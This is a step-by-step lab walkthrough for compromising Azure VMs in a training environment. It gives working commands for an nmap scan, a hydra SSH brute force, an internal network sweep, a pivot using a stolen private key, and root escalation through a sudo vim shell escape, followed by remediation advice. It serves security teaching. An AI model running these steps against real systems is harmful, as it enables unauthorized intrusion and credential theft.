# Lab 01: Compromised VM

> [!WARNING]
> **ETHICAL USE ONLY**: This lab is for educational purposes in a controlled environment. These techniques should NEVER be used against systems you don't own or don't have explicit permission to test. Unauthorized access to computer systems is illegal and unethical.

## Step 1: Connecting to the VM

1. **Check for open ports**:
   We can use nmap to scan for any open ports on our target IP address.

   ```bash
   nmap -sS -Pn <Public_IP>
   ```

    >[!NOTE]
    **-sS:** Performs a stealthy SYN scan to detect open ports.  
    **-Pn:** Skip ping sweep

2. **Attempt SSH**:  
    We see that port 22 is open. This is the default port for SSH, so let’s start by trying to SSH into the VM:

    ```bash
    ssh azureuser@<Public_IP>
    ```

    If it prompts for a password, this indicates that the VM is not using a secure authentication method like SSH keys. Let's try to crack the password.

## Step 2: Crack the Password

1. **Check Hosting Information**:  
   We can use a site like [hostingchecker.com](https://hostingchecker.com) to determine if the machine is hosted in the cloud.  

   - If the machine is hosted on Azure, the default username is often `azureuser`, so let's try using that username first.

2. **Brute Force the Password**:  
   Tools like `hydra`, `ncrack`, and `medusa` can be used for brute-forcing logins. Let's use `hydra` to perform our attack. We will need to provide a username and a list of passwords to try against. Let's try the 200 most common passwords of 2023 from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/2023-200_most_used_passwords.txt):

   ```bash
   hydra -l azureuser -P ./common_passwords.txt ssh://<Public_IP>
   ```

    > [!NOTE]
    **-l azureuser:** Specifies the username to use for the attack.  
    **-P ./common_passwords.txt:** Points to a file containing a list of common passwords.  
    **ssh://<Public_IP>:** Specifies the method and IP address.

## Step 3: Access the VM

Now, use the cracked credentials to SSH into the VM:

```bash
ssh azureuser@<Public_IP>
```

🎉 You’ve officially gained access to the VM! Remember, use your powers for good and always wear a white hat. But we’re not done yet—let’s explore further.

## Step 4: Explore the Network

There doesn't seem to be anything of use to us on this vm, so let's dig into the network.

### 4.1: Understanding the VM’s Internal Network

Run the following to check the internal IP of the current VM:

```bash
ifconfig
```

You’ll likely see an internal IP in the 10.0.0.x range (common for Azure VNets). This means the VM is part of a private network.

### 4.2: Discover Other Devices on the Network

We'll scan all devices in the 10.0.0.x range to identify active hosts. Use one of the methods below to send bulk ICMP echo probes (pings).

**Method 1: Using nmap:**
```bash
nmap -sn 10.0.0.0/24
```

>[!NOTE]
**-sn:** Ping scan only (no port scan) to discover live hosts.

**Method 2: Using fping:**
```bash
fping -g 10.0.0.1 10.0.0.254
```

>[!NOTE]
**-g** : Generates a list of IPs in the specified range and pings them.

**Method 3: Use a simple bash loop:**
```bash
echo "Scanning network..."
for i in {1..254}; do
  (ping -c 1 -W 1 10.0.0.$i >/dev/null 2>&1 && echo "10.0.0.$i is up") &
done | sort -V
```

### 4.3: Check ARP Cache (Optional)

The methods above will output the devices that responded, but if you want to verify, use the ARP cache to find devices that responded:

```bash
arp -a
```

>[!NOTE]
**-a:** Lists all entries in the ARP table.  

## Step 5: Pivot to Another VM

Hopefully you were able to find another vm on the network. Let's try to connect to it.

### 5.1: Attempt SSH with Existing Credentials

Let's first try to SSH using the same username and password:

```bash
ssh azureuser@<Internal_IP>
```

### 5.2: Permission Denied? Look for a Private Key

Do you see `Permission denied (publickey)`? Looks like they tried to beef up their security by using SSH keys instead of a password. But since we're already inside the compromised vm, let’s check for an SSH private key.

Navigate to the .ssh directory and look for a private key file, such as id_rsa.pem.:

```bash
cd ~/.ssh
ls
```

### 5.3: Use the Private Key for SSH

If you find a private key, use it to attempt access to the new VM:

```bash
ssh -i path/to/key azureuser@<Internal_IP>
```

## Step 6: Explore the Second VM

You're in! Time to explore this second VM:

### 6.1: Basic System Information

Check current user and privileges
```bash
whoami
id
```

Check system information
```bash
uname -a
cat /etc/os-release
```

### 6.2: Look for Sensitive Files

You might find some interesting files in the home directory or other locations. Spend a few minutes exploring the file system to see if you can find any sensitive files or directories that might contain the secret! 

Here are some helpful commands for exploring:

```bash
# List files in the current directory
ls

# Change directory
cd <directory_name>

# Read a file
cat <file_name>

# List all directories and files in a tree structure
tree
```

### 6.3: Find Hidden Files

The regular `ls` and `tree` commands might not show everything. 

Try:

```bash
# List files in the current directory, including hidden files
ls -a

# List all directories and files in a tree structure, including hidden files
tree -a
```

Now you should see some hidden files scattered around! Keep exploring with `ls`, `cd`, and `cat` until you find what looks like the real secret.

> [!TIP]
> **Hidden Files**: Files starting with a dot (.) are hidden by default. The `-a` flag reveals them!

### 6.4: Navigate to the Secret

Try to `cat` the file you think contains the secret. You will be faced with a "Permission denied" error, indicating that the file is protected and you don't have permission to read it as the current user.

## Step 7: Privilege Escalation
### 7.1: Check for Privilege Escalation Opportunities

You might be able to escalate your privileges using `sudo`. First, check if you have any sudo privileges:

```bash
sudo -l
```

>[!NOTE]
**-l:** Lists the allowed (and forbidden) commands for the current user.

You should see:

```text
User azureuser may run the following commands on MrMoneyBagsVM:
    (ALL) NOPASSWD: /usr/bin/vim
```

This means that you can run `vim` as root without needing to enter a password. This is a common misconfiguration that can lead to privilege escalation.

### 7.2: Use Vim for Privilege Escalation

There are two main ways to use `vim` for privilege escalation:
1. **Read the file directly**: 
    
    This way is simple and straightforward. You can open the secret file with `vim` and read its contents.

    ```bash
    sudo vim /path/to/the/secret/file
    ```

1. **Escape to a root shell**:
    
    This way is a bit more involved but much more **powerful**. You can use `vim` to get a root shell and then read the file.

    ```bash
    sudo vim
    ```

    Once inside `vim`, type the following command to escape to a root shell:

    ```vim
    :!/bin/bash
    ```

    This will give you a root shell where you will have full access to the system and can read any file, including the secret one!

## Step 8: You did it! 🎉
Congratulations! 

You have successfully compromised the VM, navigated the network, and escalated your privileges to read the secret file. Take a moment to reflect on what you learned about common security misconfigurations and how they can be exploited. 

Optionally, you can now try to secure the VM by applying any remediation steps below.


## Remediation

After completing the exercise, feel free to use the vulnerabilities you learned about to secure the vms.

Suggestions for improved security include:

1. **Use Strong Authentication:**
   - Disable password-based SSH authentication and use key pairs instead.
   - Use a passphrase on top of your private keys.

2. **Fix Sudo Misconfigurations:**
   - Remove overly permissive sudo rules that allow text editors or other dangerous programs.
   - Use `sudo visudo` to safely edit sudoers files.
   - Follow the principle of least privilege.

3. **Restrict Network Access:**
    - Update NSG rules to allow SSH only from specific trusted IPs.
    - Change the default SSH port from 22 to a non-standard port.
    - Remove any broad rules like Allow Any or unrestricted inbound access.

4. **Connect via Bastion:**
    - If your vm does not require a public IP, delete the public IP and connect through Azure Bastion instead.

5. **Monitor and Audit Logs:**
    - Enable logging for SSH access and network activities.
    - Use Azure Monitor and Security Center to detect unusual login attempts.